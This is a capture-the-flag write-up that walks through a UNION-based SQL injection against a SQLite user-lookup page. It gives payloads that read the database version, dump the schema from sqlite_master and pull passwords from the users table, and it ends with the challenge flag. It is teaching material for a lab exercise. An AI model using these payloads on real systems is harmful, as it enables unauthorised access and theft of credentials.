---
custom_edit_url: null
---

> Select the user by ID you wish to view

<figure style={{ textAlign: 'center' }}>
![1](https://github.com/Kunull/Write-ups/assets/110326359/6a959b03-a547-4541-905b-a2a9d80c4848)
</figure>

Let's click on the `Submit Query` button.

<figure style={{ textAlign: 'center' }}>
![2](https://github.com/Kunull/Write-ups/assets/110326359/fdd16ff0-d37f-44e2-b1db-91355a5734fb)
</figure>

Reading the source code, we can see that the database being used is SQLite and our input is being inserted within the following query:

<figure style={{ textAlign: 'center' }}>
![3](https://github.com/Kunull/Write-ups/assets/110326359/1742de8f-980c-4496-86c4-342d14b2d981)
</figure>

```sql
SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1
```

## SQL Injection

In order to retrieve the flag, we first need to retrieve the table name. We can refer this [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) list.

### Extracting SQLite version

The SQLite version can be retrieved using the following query:

```sql
SELECT sqlite_version();
```

Since the original `SELECT` statement selects two columns, we need to do the same in our `UNION` query.

If we provide the following input:

```
1 UNION SELECT Null, sqlite_version();
```

The resultant query will be:

```sql
SELECT id,username FROM users WHERE id=1 UNION SELECT Null, sqlite_version(); LIMIT 1
```

<figure style={{ textAlign: 'center' }}>
![4](https://github.com/Kunull/Write-ups/assets/110326359/19852d2c-fdd7-4314-b30a-317dfa687674)
</figure>

The version of SQLite being used is `3.27.2`.

### Extracting database structure

For SQLite versions `3.33.0` and previous, the `sqlite_master` table contains the schema for the database including information about all the tables, indexes, views, and triggers that exist in the database.

```sql
SELECT sql FROM sqlite_master
```

If we provide the following input:

```
1 UNION SELECT Null, sql FROM sqlite_master;
```

The resultant query becomes:

```sql
SELECT id,username FROM users WHERE id=1 UNION SELECT Null, sql FROM sqlite_master; LIMIT 1
```

<figure style={{ textAlign: 'center' }}>
![5](https://github.com/Kunull/Write-ups/assets/110326359/e4d213c2-8870-4a0e-88be-584162fcd0a5)
</figure>

There is a `users` table which has three columns: `id`, `username` and `password`.

### Extracting the flag

Now that we know the table name is `users`, we can easily retrieve the password from the table.

If we provide the following input:

```
1 UNION SELECT id, password FROM users;
```

The resultant query becomes:

```
SELECT id,username FROM users WHERE id=1 UNION SELECT id, password FROM users; LIMIT 1
```

<figure style={{ textAlign: 'center' }}>
![6](https://github.com/Kunull/Write-ups/assets/110326359/76b1488a-e890-45b5-8fc7-d4f598288910)
</figure>

## Flag

```
WEBSEC{Simple_SQLite_Injection}
```
